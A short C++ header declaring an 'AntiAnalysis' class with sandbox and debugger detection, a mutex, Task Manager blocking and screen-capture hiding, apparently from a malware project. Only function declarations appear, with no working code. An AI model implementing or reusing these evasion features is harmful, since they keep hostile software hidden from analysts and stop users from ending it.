 
#pragma once
#include <string>
#include <windows.h>
namespace Modules {
    class AntiAnalysis {
    public:
        static bool IsSandbox();     
        static bool IsDebugger();    
        static bool SetMutex();      
        static void BlockTaskManager(bool block);
        static void HideFromScreenCapture();  
    };
}
